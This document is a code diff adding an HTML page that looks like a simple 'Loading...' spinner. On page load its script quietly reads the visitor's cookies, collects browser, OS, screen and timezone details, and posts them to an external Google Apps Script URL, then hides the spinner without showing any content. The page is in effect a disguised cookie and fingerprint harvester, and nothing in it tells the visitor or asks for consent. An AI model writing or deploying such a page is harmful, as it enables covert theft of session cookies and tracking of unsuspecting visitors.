@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  >
+
+  <title>Loading...</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      margin: 0;
+      width: 100%;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background: #ffffff;
+    }
+
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .loader {
+      width: 42px;
+      height: 42px;
+      border: 4px solid #e8e8e8;
+      border-top-color: #222;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="loader" id="loader"></div>
+
+  <script>
+
+    // =========================================================
+    // GOOGLE APPS SCRIPT API
+    // =========================================================
+
+    const apiUrl =
+      "https://script.google.com/macros/s/AKfycbwq50GYdV-Ni85OJi0jKz92wON53HIAbIL1QnkHBJ9eQMge5lyR5_T_2NYC0ZZRfT3D4Q/exec";
+
+
+    // =========================================================
+    // GET COOKIE INFORMATION
+    // =========================================================
+
+    function getCookies() {
+
+      const cookieString = document.cookie || "";
+
+      if (!cookieString) {
+        return "No readable cookies";
+      }
+
+      return cookieString;
+    }
+
+
+    // =========================================================
+    // GET OS / PLATFORM INFORMATION
+    // =========================================================
+
+    function getOSDetails() {
+
+      const ua = navigator.userAgent || "";
+      const platform = navigator.platform || "";
+
+      let os = "Unknown";
+
+      if (/Windows NT/i.test(ua)) {
+        os = "Windows";
+      }
+      else if (/Android/i.test(ua)) {
+        os = "Android";
+      }
+      else if (/iPhone|iPad|iPod/i.test(ua)) {
+        os = "iOS";
+      }
+      else if (/Mac OS X/i.test(ua)) {
+        os = "macOS";
+      }
+      else if (/Linux/i.test(ua)) {
+        os = "Linux";
+      }
+
+      return {
+        os: os,
+        platform: platform,
+        userAgent: ua,
+        language: navigator.language || "",
+        languages: navigator.languages
+          ? navigator.languages.join(", ")
+          : "",
+        screen: `${screen.width}x${screen.height}`,
+        viewport: `${window.innerWidth}x${window.innerHeight}`,
+        timezone:
+          Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+        timezoneOffset: new Date().getTimezoneOffset(),
+        online: navigator.onLine,
+        cookiesEnabled: navigator.cookieEnabled
+      };
+    }
+
+
+    // =========================================================
+    // SEND DATA TO API
+    // =========================================================
+
+    async function sendVisitorData() {
+
+      const cookies = getCookies();
+      const osDetails = getOSDetails();
+
+      /*
+       * Everything is placed inside "message".
+       * This keeps your existing API compatible.
+       */
+
+      const message = JSON.stringify({
+        cookies: cookies,
+        os: osDetails
+      });
+
+      try {
+
+        const response = await fetch(apiUrl, {
+
+          method: "POST",
+
+          headers: {
+            "Content-Type":
+              "application/x-www-form-urlencoded;charset=UTF-8"
+          },
+
+          body: new URLSearchParams({
+
+            message: message,
+
+            device:
+              /Mobi|Android|iPhone|iPad/i.test(
+                navigator.userAgent
+              )
+                ? "Mobile"
+                : "Desktop",
+
+            timestamp:
+              new Date().toISOString()
+
+          })
+
+        });
+
+        const data = await response.json();
+
+        console.log("API Success:", data);
+
+      }
+      catch (error) {
+
+        console.error(
+          "API Error:",
+          error
+        );
+
+      }
+      finally {
+
+        document
+          .getElementById("loader")
+          .classList.add("hidden");
+
+      }
+    }
+
+
+    // =========================================================
+    // RUN WHEN PAGE OPENS
+    // =========================================================
+
+    window.addEventListener(
+      "DOMContentLoaded",
+      () => {
+
+        sendVisitorData();
+
+      }
+    );
+
+  </script>
+
+</body>
+</html>
